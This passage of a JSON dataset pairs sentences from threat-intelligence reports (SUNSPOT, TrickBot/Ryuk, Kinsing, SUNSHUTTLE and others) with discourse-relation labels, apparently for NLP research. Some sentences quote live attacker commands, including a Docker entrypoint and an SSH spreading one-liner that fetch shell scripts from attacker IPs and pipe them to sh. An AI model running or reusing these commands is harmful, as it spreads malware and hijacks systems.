        "relation": "ELABORATION"
    },
    {
        "S1": "The actors reference multiple official agencies, including the General Secretariat of the Cooperation Council for the Arab States of the Gulf and the UAE National Media Council, likely in an effort to add the appearance of legitimacy.",
        "S2": "While the actors attempted to make the installation appear legitimate, closer inspection of the client launch parameters reveals the potential for broader MOFA targeting.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The geopolitical-themed ZIP contains an EXE file with the same name that begins the installation process for ScreenConnect when executed (see Figure 4).",
        "S2": "The actors responsible for these attacks used ScreenConnect to connect to endpoints on client networks, enabling them to conduct further lateral movements and automated actions on objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "Between 2016 and 2020, we have seenScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors",
        "S2": "For example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and India-based Wipro.[7]",
        "relation": "ELABORATION"
    },
    {
        "S1": "Between 2016 and 2020, we have seenScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors",
        "S2": "In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD SOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and India-based Wipro.[7]",
        "S2": "In 2019, another threat group used ConnectWise to execute PowerShell commands in their target environments.",
        "relation": "MISC"
    },
    {
        "S1": "For example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and India-based Wipro.[7]",
        "S2": "During an incident impacting Cognizant and their client Maritz Holdings, actors used ScreenConnect to propagate to other connected systems and caused over $1.8 million (USD) in losses through a gift card fraud scheme.[6]",
        "relation": "ELABORATION"
    },
    {
        "S1": "In 2019, another threat group used ConnectWise to execute PowerShell commands in their target environments.",
        "S2": "In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD SOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]",
        "relation": "NEXT"
    },
    {
        "S1": "In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD SOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]",
        "S2": "ScreenConnect offers three primary functions that each contain different valuable features for threat actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "ScreenConnect\u2019s capabilities are shown in Table 1 below.",
        "S2": "While the ScreenConnectclient agent is being installed, the server component expects a connection and the server can identify the client agent through a public key thumbprint.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While the actors attempted to make the installation appear legitimate, closer inspection of the client launch parameters reveals the potential for broader MOFA targeting.",
        "S2": "The actors again created a custom field parameter, however, this one is kept to a generic MOFA targeting that appears as MFA: &c=mfa&c=mfa.gov",
        "relation": "ELABORATION"
    },
    {
        "S1": "While the ScreenConnectclient agent is being installed, the server component expects a connection and the server can identify the client agent through a public key thumbprint.",
        "S2": "Analysis of the authentic launch parameters passed back to the server as part of Screenconnect functionality is shown in Table 2 below.",
        "relation": "NEXT"
    },
    {
        "S1": "The thumbprint is a 16 character string located at \"C:\\Program Files (x86)\\ScreenConnect Client (a97eeae2330a1851)\u201d",
        "S2": "The main launch parameter that indicates this EXE is designed to target MOFAs are the custom c parameters:",
        "relation": "MISC"
    },
    {
        "S1": "The main launch parameter that indicates this EXE is designed to target MOFAs are the custom c parameters:",
        "S2": "The ScreenConnect launch parameters from \u0627\u0644\u0645\u0646\u062d \u0627\u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .exe is shown below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "These point to various copies of TrickBot installed in the system, usually within the user profile under %USER_DIR%\\AppData\\Roaming\\ or a subdirectory.",
        "S2": "TrickBot may also be installed as a service with names like \u201cControlServiceA\u201d that points to a copy in the system drive root.",
        "relation": "ELABORATION"
    },
    {
        "S1": "TrickBot may also be installed as a service with names like \u201cControlServiceA\u201d that points to a copy in the system drive root.",
        "S2": "The TrickBot module used for credential harvesting is pwgrab64 .",
        "relation": "MISC"
    },
    {
        "S1": "WIZARD SPIDER uses a module named NewBCtestnDll64 as a reverse SOCKS proxy that allows for the download and installation of the open source PowerShell Empire post-exploitation framework.",
        "S2": "Each instance of the Updater service connects to a single IP address, and multiple versions may be added at the same time, pointing to different IPs and requesting a .php resource.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each instance of the Updater service connects to a single IP address, and multiple versions may be added at the same time, pointing to different IPs and requesting a .php resource.",
        "S2": "In the investigations reviewed by CrowdStrike Services, the UseLogonCredential registry value was observed having been set to \u201c1\u201d on systems throughout the infrastructure, often in conjunction with TrickBot\u2019s first deployment to the host.",
        "relation": "MISC"
    },
    {
        "S1": "As with all modules launched by the TrickBot core, pwgrab64 is installed into a subfolder, usually named either \u201cmodules\u201d or \u201cdata,\u201d and modified the following registry value:",
        "S2": "Older versions of the pwgrab module has a limited scope that targets mail clients, web browsers, FileZilla and WinSCP.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As with all modules launched by the TrickBot core, pwgrab64 is installed into a subfolder, usually named either \u201cmodules\u201d or \u201cdata,\u201d and modified the following registry value:",
        "S2": "In the investigations reviewed by CrowdStrike Services, the UseLogonCredential registry value was observed having been set to \u201c1\u201d on systems throughout the infrastructure, often in conjunction with TrickBot\u2019s first deployment to the host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Setting the \u201cUseLogonCredential\u201d value to \u201c1\u201d configures the Windows operating system to store credentials as cleartext in memory, where they can then be retrieved via the use of credential dumping tools.",
        "S2": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Older versions of the pwgrab module has a limited scope that targets mail clients, web browsers, FileZilla and WinSCP.",
        "S2": "This module has a battery of command line, WMI and LDAP queries to gather information, and then exfiltrate the data to GRIM SPIDER for review.",
        "relation": "MISC"
    },
    {
        "S1": "TrickBot downloads modules for collecting local system information and scouting the network, primarily part of the networkdll module.",
        "S2": "Using this common administrator tool, GRIM SPIDER can traverse the network, remotely installing TrickBot and adding persistence to new targets.",
        "relation": "MISC"
    },
    {
        "S1": "This module has a battery of command line, WMI and LDAP queries to gather information, and then exfiltrate the data to GRIM SPIDER for review.",
        "S2": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "S2": "Subsequently, the adversary copies the Microsoft SysInternals PSTools archive to this system, and executes PsExec.exe , a utility that allows them to move laterally and execute commands on other Windows systems within the infrastructure.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "S2": "GRIM SPIDER also has been observed selecting a server to be the primary staging point.",
        "relation": "ELABORATION"
    },
    {
        "S1": "GRIM SPIDER also has been observed selecting a server to be the primary staging point.",
        "S2": "Using this common administrator tool, GRIM SPIDER can traverse the network, remotely installing TrickBot and adding persistence to new targets.",
        "relation": "MISC"
    },
    {
        "S1": "Subsequently, the adversary copies the Microsoft SysInternals PSTools archive to this system, and executes PsExec.exe , a utility that allows them to move laterally and execute commands on other Windows systems within the infrastructure.",
        "S2": "Once GRIM SPIDER has gained access to credentials and a Domain Controller, or other host management server, they would then stage the Ryuk ransomware on that system and deploy to targets via PsExec.",
        "relation": "NEXT"
    },
    {
        "S1": "Using this common administrator tool, GRIM SPIDER can traverse the network, remotely installing TrickBot and adding persistence to new targets.",
        "S2": "Once GRIM SPIDER has gained access to credentials and a Domain Controller, or other host management server, they would then stage the Ryuk ransomware on that system and deploy to targets via PsExec.",
        "relation": "NEXT"
    },
    {
        "S1": "TrickBot also has the shareDll module for propagating to other hosts using the current, active user credentials.",
        "S2": "In observed instances, the deployment and execution of Ryuk occurred in one session, typically lasting 3 to 8 hours.",
        "relation": "MISC"
    },
    {
        "S1": "It then creates an encrypted log file at C:\\Windows\\Temp\\vmware-vmdmp.log .",
        "S2": "Throughout execution, SUNSPOT will log errors to this file, along with other deployment information.",
        "relation": "NEXT"
    },
    {
        "S1": "Throughout execution, SUNSPOT will log errors to this file, along with other deployment information.",
        "S2": "An extract of a log file generated by SUNSPOT in a test environment is given below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Most log lines corresponding to an error contain a step number (e.g., Step19) requiring knowledge of the malware to understand their meaning.",
        "S2": "The step numbering does not follow the actual execution order, suggesting the calls to the logging function were added by the developers during the creation of the malware as they progressed and needed to focus their efforts on debugging one part of the code.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These steps and their mapping to the malware actions are provided at the end of this blog.",
        "S2": "- The following TTPs may be used to characterize the SUNSPOT activity described in this blog:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The step numbering does not follow the actual execution order, suggesting the calls to the logging function were added by the developers during the creation of the malware as they progressed and needed to focus their efforts on debugging one part of the code.",
        "S2": "The malware then grants itself debugging privileges by modifying its security token to add SeDebugPrivilege .",
        "relation": "NEXT"
    },
    {
        "S1": "An extract of a log file generated by SUNSPOT in a test environment is given below.",
        "S2": "This step is a prerequisite for the remainder of SUNSPOT\u2019s execution, which involves reading other processes\u2019 memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware then grants itself debugging privileges by modifying its security token to add SeDebugPrivilege .",
        "S2": "Although the mutex created during the initialization should already prevent multiple process monitoring loops from running, the malware checks for the presence of a second mutex \u2014 {56331e4d-76a3-0390-a7ee-567adf5836b7} .",
        "relation": "NEXT"
    },
    {
        "S1": "After initialization, SUNSPOT monitors running processes for instances of MsBuild.exe , which is part of Microsoft Visual Studio development tools.",
        "S2": "When SUNSPOT finds an MsBuild.exe process, it will spawn a new thread to determine if the Orion software is being built and, if so, hijack the build operation to inject SUNBURST.",
        "relation": "NEXT"
    },
    {
        "S1": "After initialization, SUNSPOT monitors running processes for instances of MsBuild.exe , which is part of Microsoft Visual Studio development tools.",
        "S2": "The command line is then parsed to extract individual arguments, and SUNSPOT looks for the directory path of the Orion software Visual Studio solution.",
        "relation": "NEXT"
    },
    {
        "S1": "When SUNSPOT finds an MsBuild.exe process, it will spawn a new thread to determine if the Orion software is being built and, if so, hijack the build operation to inject SUNBURST.",
        "S2": "Stopping SUNSPOT in the middle of its operation could result in unfinished tampering of the Orion source code, and lead to Orion build errors that SolarWinds developers would investigate, revealing the adversary\u2019s presence.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The monitoring loop executes every second, allowing SUNSPOT to modify the target source code before it has been read by the compiler.",
        "S2": "Stopping SUNSPOT in the middle of its operation could result in unfinished tampering of the Orion source code, and lead to Orion build errors that SolarWinds developers would investigate, revealing the adversary\u2019s presence.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Stopping SUNSPOT in the middle of its operation could result in unfinished tampering of the Orion source code, and lead to Orion build errors that SolarWinds developers would investigate, revealing the adversary\u2019s presence.",
        "S2": "The command line is then parsed to extract individual arguments, and SUNSPOT looks for the directory path of the Orion software Visual Studio solution.",
        "relation": "MISC"
    },
    {
        "S1": "A call to NtQueryInformationProcess allows the adversary to obtain a pointer to the remote process\u2019s Process Environment Block (PEB), which contains a pointer to a _RTL_USER_PROCESS_PARAMETERS structure.",
        "S2": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "relation": "MISC"
    },
    {
        "S1": "The command line is then parsed to extract individual arguments, and SUNSPOT looks for the directory path of the Orion software Visual Studio solution.",
        "S2": "When SUNSPOT finds the Orion solution file path in a running MsBuild.exe process, it replaces a source code file in the solution directory, with a malicious variant to inject SUNBURST while Orion is being built.",
        "relation": "NEXT"
    },
    {
        "S1": "The same material is used for all of the blobs encrypted with AES in the binary.",
        "S2": "It is plausible the material was chosen on purpose in order to make static detections on the values impractical.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The key and initialization vector (IV) are not unique and can be independently found in other binary samples of several popular video games.",
        "S2": "The malicious source code for SUNBURST, along with target file paths, are stored in AES128-CBC encrypted blobs and are protected using the same key and initialization vector.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When SUNSPOT finds the Orion solution file path in a running MsBuild.exe process, it replaces a source code file in the solution directory, with a malicious variant to inject SUNBURST while Orion is being built.",
        "S2": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malicious source code for SUNBURST, along with target file paths, are stored in AES128-CBC encrypted blobs and are protected using the same key and initialization vector.",
        "S2": "In the exemplar SUNSPOT sample, the MD5 hash for the backdoored source code is 5f40b59ee2a9ac94ddb6ab9e3bd776ca .",
        "relation": "ELABORATION"
    },
    {
        "S1": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "S2": "In order to remove compilation warnings that could be generated by the adversary\u2019s own code \u2014 which could alert the SolarWinds developers \u2014 StellarParticle made their edits within #pragma warning disable and #pragma warning restore statements, hinting at what parts were edited.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "S2": "If the Orion solution build is successful, it is backdoored with SUNBURST.",
        "relation": "NEXT"
    },
    {
        "S1": "In the exemplar SUNSPOT sample, the MD5 hash for the backdoored source code is 5f40b59ee2a9ac94ddb6ab9e3bd776ca .",
        "S2": "The backdoored source is written to the same filename, but with a .tmp extension (e.g., InventoryManager.tmp ), before being moved using MoveFileEx to the original filename ( InventoryManager.cs ).",
        "relation": "ELABORATION"
    },
    {
        "S1": "If the decryption of the parameters (target file path and replacement source code) is successful and if the MD5 checks pass, SUNSPOT proceeds with the replacement of the source file content.",
        "S2": "After these steps, the source file backdoored with SUNBURST will then be compiled as part of the standard process.",
        "relation": "NEXT"
    },
    {
        "S1": "If the Orion solution build is successful, it is backdoored with SUNBURST.",
        "S2": "The use of generic variable names, pre-obfuscated strings, and the lack of developer comments or disabled code is similar to what could be obtained after decompiling a backdoored Orion binary, as illustrated in Figure 2, which provides a comparison between the injected source code (top) and a decompilation output (bottom).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The source code of SUNBURST was likely sanitized before being included in SUNSPOT.",
        "S2": "In particular, SUNSPOT\u2019s entry point was added to the legitimate Orion software RefreshInternal function by adding the following try/catch block:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The use of generic variable names, pre-obfuscated strings, and the lack of developer comments or disabled code is similar to what could be obtained after decompiling a backdoored Orion binary, as illustrated in Figure 2, which provides a comparison between the injected source code (top) and a decompilation output (bottom).",
        "S2": "In particular, SUNSPOT\u2019s entry point was added to the legitimate Orion software RefreshInternal function by adding the following try/catch block:",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to remove compilation warnings that could be generated by the adversary\u2019s own code \u2014 which could alert the SolarWinds developers \u2014 StellarParticle made their edits within #pragma warning disable and #pragma warning restore statements, hinting at what parts were edited.",
        "S2": "- Log entries from different executions of the malware that are separated with a hard-coded value 32 78 A5 E7 1A 79 91 AC",
        "relation": "MISC"
    },
    {
        "S1": "- Log entries from different executions of the malware that are separated with a hard-coded value 32 78 A5 E7 1A 79 91 AC",
        "S2": "- Attempt to open a non-existing mutex to detect when the malware operators want the backdoor to stop execution and safely exit",
        "relation": "MISC"
    },
    {
        "S1": "Taking advantage of the unprotected open Docker API port, the attackers are able to instantiate an Ubuntu container with the following entry point: /bin/bash -c apt-get update && apt-get install -y wget cron;service cron start; wget -q -O - 142.44.191.122/d.sh | sh;tail -f /dev/null",
        "S2": "- Run the shell script and read indefinitely from /dev/null to keep the container alive and running",
        "relation": "NEXT"
    },
    {
        "S1": "Taking advantage of the unprotected open Docker API port, the attackers are able to instantiate an Ubuntu container with the following entry point: /bin/bash -c apt-get update && apt-get install -y wget cron;service cron start; wget -q -O - 142.44.191.122/d.sh | sh;tail -f /dev/null",
        "S2": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.",
        "relation": "MISC"
    },
    {
        "S1": "We witnessed 3 IP addresses used in total--the one in the example above, 217.12.221.244 and 185.92.74.42",
        "S2": "We discovered that the shell script does the following:",
        "relation": "MISC"
    },
    {
        "S1": "- Install wget with apt-get",
        "S2": "- Download a shell script with the just installed wget",
        "relation": "NEXT"
    },
    {
        "S1": "- Run the shell script and read indefinitely from /dev/null to keep the container alive and running",
        "S2": "The script would be later used in order to gain persistency within the container.",
        "relation": "NEXT"
    },
    {
        "S1": "We discovered that the shell script does the following:",
        "S2": "- Uses crontab to download and run the shell script every minute",
        "relation": "ELABORATION"
    },
    {
        "S1": "We discovered that the shell script does the following:",
        "S2": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Downloads the \u2018kinsing\u2019 malware and runs it",
        "S2": "Kinsing is a Linux agent, identified by Virus Total after we submitted it for analysis.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.",
        "S2": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "relation": "NEXT"
    },
    {
        "S1": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.",
        "S2": "We noticed a comment in the script for a 20 seconds sleep after every 20 SSH connection attempts, and their cleanup, possibly indicating that the attackers have some sense of evasion and were trying to hide their activities.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Kinsing is a Linux agent, identified by Virus Total after we submitted it for analysis.",
        "S2": "We did not identify any active scanning techniques used to identify additional targets.",
        "relation": "MISC"
    },
    {
        "S1": "It uses several Go libraries, including:",
        "S2": "Running the malware in a controlled environment and monitoring it brought up more details about its malicious actions.",
        "relation": "MISC"
    },
    {
        "S1": "It appears that there are dedicated servers for each function that the malware executes:",
        "S2": "The malware communicates with that host over HTTP port 80, and sends small encrypted messages on regular intervals, every few seconds.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware communicates with that host over HTTP port 80, and sends small encrypted messages on regular intervals, every few seconds.",
        "S2": "The spre.sh shell script that the malware downloads is used to laterally spread the malware across the container network.",
        "relation": "NEXT"
    },
    {
        "S1": "- Connects to 217.12.221.244/spre.sh, which we presume stands for spread, as we will see in the next paragraph, to download a shell script used for lateral movement purposes.",
        "S2": "The spre.sh shell script that the malware downloads is used to laterally spread the malware across the container network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The spre.sh shell script that the malware downloads is used to laterally spread the malware across the container network.",
        "S2": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We did not identify any active scanning techniques used to identify additional targets.",
        "S2": "We noticed a comment in the script for a 20 seconds sleep after every 20 SSH connection attempts, and their cleanup, possibly indicating that the attackers have some sense of evasion and were trying to hide their activities.",
        "relation": "MISC"
    },
    {
        "S1": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "S2": "The following SSH command was used to spread it throughout the network: ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp \"sudo curl -L http://217.12.221.244/spr.sh|sh; sudo wget -q -O - http://217.12.221.244/spr.sh|sh;\"",
        "relation": "ELABORATION"
    },
    {
        "S1": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "S2": "At the last stage of the attack the malware runs a cryptominer called kdevtmpfsi.",
        "relation": "NEXT"
    },
    {
        "S1": "As pointed out in Malwarebytes\u2019s public report, the actor sent weaponized documents to the victim as an initial infection vector.",
        "S2": "- The user opens the malicious document and subsequently allows the macro to be executed;",
        "relation": "NEXT"
    },
    {
        "S1": "As pointed out in Malwarebytes\u2019s public report, the actor sent weaponized documents to the victim as an initial infection vector.",
        "S2": "Besides the Microsoft Word document, the actor used an additional, alternative infection method according to our telemetry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Execute image003.zip, which actually contains HTML Application (HTA) code, with mshta.exe;",
        "S2": "This HTA code creates the next payload at the hardcoded path C:/Users/Public/Downloads/Winvoke.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "The executed image003.zip is an HTML Application (HTA) file containing the second stage payload.",
        "S2": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although we weren\u2019t able to acquire the initial file, we assume the actor delivered a file disguised as a PDF, since we discovered artefacts containing the path of the tool ezPDFReader: c:\\program files (x86)\\unidocs\\ezpdfreader2.0g\\ezpdfwslauncher.exe.",
        "S2": "We first saw the URL appearing in the context of this threat actor in September 2020 and it was still in use when we were researching this series of attacks at the end of April 2021.",
        "relation": "MISC"
    },
    {
        "S1": "Although we weren\u2019t able to acquire the initial file, we assume the actor delivered a file disguised as a PDF, since we discovered artefacts containing the path of the tool ezPDFReader: c:\\program files (x86)\\unidocs\\ezpdfreader2.0g\\ezpdfwslauncher.exe.",
        "S2": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "S2": "We first saw the URL appearing in the context of this threat actor in September 2020 and it was still in use when we were researching this series of attacks at the end of April 2021.",
        "relation": "MISC"
    },
    {
        "S1": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "S2": "This ransomware sample is custom made and specifically developed by the threat actor behind this attack.",
        "relation": "MISC"
    },
    {
        "S1": "Notably, the compromised website www.allamwith[.]com was used for a long period of time.",
        "S2": "The URL hosts still serving the HTML Application (HTA) file exhibit similar functions as the HTA file created by the malicious Word document.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When we analyzed the above malicious URLs, many of the resources had already gone offline, but the attacker is still using one distribution URL: hxxp://www.allamwith[.]com/home/css/skin.html",
        "S2": "The malware operator appears to deliver the third stage payload by using the above functionalities, as our telemetry reveals.",
        "relation": "NEXT"
    },
    {
        "S1": "The second stage payload is responsible for communicating with the C2 server and preparing another payload for the next stage.",
        "S2": "According to the response from the C2 server, the payload is able to perform five actions:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It uses an embedded 16-byte XOR key to decrypt the base64 encoded payload.",
        "S2": "The infection procedure of the second stage payload:",
        "relation": "MISC"
    },
    {
        "S1": "The infection procedure of the second stage payload:",
        "S2": "According to the response from the C2 server, the payload is able to perform five actions:",
        "relation": "NEXT"
    },
    {
        "S1": "According to the response from the C2 server, the payload is able to perform five actions:",
        "S2": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware operator appears to deliver the third stage payload by using the above functionalities, as our telemetry reveals.",
        "S2": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware operator appears to deliver the third stage payload by using the above functionalities, as our telemetry reveals.",
        "S2": "We saw the malware executed with the following parameter options in our telemetry, with some parameters illustrated below:",
        "relation": "MISC"
    },
    {
        "S1": "Both second and third stage payloads also share an identical icon, which looks like Internet Explorer.",
        "S2": "Most of them use Internet Explorer or Google Chrome icons and corresponding file names to disguise themselves as legitimate internet browsers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "S2": "The embedded payload shows the same structure as the second stage payload discussed above.",
        "relation": "MISC"
    },
    {
        "S1": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "S2": "The third stage decrypts the embedded payload and executes it.",
        "relation": "NEXT"
    },
    {
        "S1": "The embedded payload shows the same structure as the second stage payload discussed above.",
        "S2": "The malware then sends a hardcoded string to the C2 server: \u201cHTTP 1.1 /member.php SSL3.4\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "Once launched, it checks for the mutex QD33qhhXKK and inspects the system for signs of a sandbox environment by searching for the presence of specific modules.",
        "S2": "With the environment checks done, the main payload gets decrypted using the same XOR key and launched with rundll32.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "The strings of module names to be checked are decoded with a hardcoded XOR key: 0x4B762A554559586F6A45656545654130",
        "S2": "With the environment checks done, the main payload gets decrypted using the same XOR key and launched with rundll32.exe.",
        "relation": "MISC"
    },
    {
        "S1": "Three C2 addresses then get extracted and decrypted using DES, with all addresses pointing to the same IP (23.229.111[.]197) in this sample.",
        "S2": "This ransomware sample is custom made and specifically developed by the threat actor behind this attack.",
        "relation": "MISC"
    },
    {
        "S1": "Next, it checks if the C2\u2019s response data equals \u201cHTTP 1.1 200 OK SSL2.1\u201d and, if positive, starts conducting its backdoor operations.",
        "S2": "This ransomware is controlled by command line parameters and can either retrieve an encryption key from the C2 or, alternatively, as an argument at launch time.",
        "relation": "MISC"
    },
    {
        "S1": "Interestingly, one victim was discovered to have received ransomware after the third stage payload.",
        "S2": "This ransomware is controlled by command line parameters and can either retrieve an encryption key from the C2 or, alternatively, as an argument at launch time.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This ransomware is controlled by command line parameters and can either retrieve an encryption key from the C2 or, alternatively, as an argument at launch time.",
        "S2": "If the malware is executed with the -s(-S) option, it sends the victim ID to the C2 server and receives the initial vector (IV) and key to encrypt files.",
        "relation": "MISC"
    },
    {
        "S1": "If the malware is executed with the -s(-S) option, it sends the victim ID to the C2 server and receives the initial vector (IV) and key to encrypt files.",
        "S2": "When the ransomware communicates with the C2 server, it uses the same authentication process and strings as the third stage payload.",
        "relation": "MISC"
    },
    {
        "S1": "Once executed, the SUNSHUTTLE backdoor enumerates the victim\u2019s MAC address and compares it to a hardcoded MAC address value \u201cc8:27:cc:c2:37:5a\u201d.",
        "S2": "The MAC address is likely a default MAC address for the Windows sandbox network adapter.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once executed, the SUNSHUTTLE backdoor enumerates the victim\u2019s MAC address and compares it to a hardcoded MAC address value \u201cc8:27:cc:c2:37:5a\u201d.",
        "S2": "If the check is successful, the SUNSHUTTLE backdoor then enters a routine named \u201c\ufeffmain_define_internal_settings\u201d, which handles creation of the configuration file if one doesn\u2019t already exist in the directory from which SUNSHUTTLE is running.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If a match is found the backdoor exits.",
        "S2": "If the check is successful, the SUNSHUTTLE backdoor then enters a routine named \u201c\ufeffmain_define_internal_settings\u201d, which handles creation of the configuration file if one doesn\u2019t already exist in the directory from which SUNSHUTTLE is running.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the check is successful, the SUNSHUTTLE backdoor then enters a routine named \u201c\ufeffmain_define_internal_settings\u201d, which handles creation of the configuration file if one doesn\u2019t already exist in the directory from which SUNSHUTTLE is running.",
        "S2": "If set in the configuration, the \u201cblend-in\u201d traffic occurs as the malware executes and transitions through its routines.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If set in the configuration, the \u201cblend-in\u201d traffic occurs as the malware executes and transitions through its routines.",
        "S2": "SUNSHUTTLE performs initial requests to the C2 in order to request and then retrieve what it internally refers to as a session key.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If set in the configuration, the \u201cblend-in\u201d traffic occurs as the malware executes and transitions through its routines.",
        "S2": "After the configuration is created or read from, SUNSHUTTLE enters a routine named \u201c\ufeffmain_request_session_key\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "The retrieved session key from the C2 appears to be RSA decrypted using the following private key that is embedded in SUNSHUTTLE and believed to be unique per compiled sample.",
        "S2": "Inside the \u201c\ufeffmain_request_session_key\u201d routine, SUNSHUTTLE constructs an HTTPS request to its configured C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After the configuration is created or read from, SUNSHUTTLE enters a routine named \u201c\ufeffmain_request_session_key\u201d.",
        "S2": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted",
        "relation": "NEXT"
    },
    {
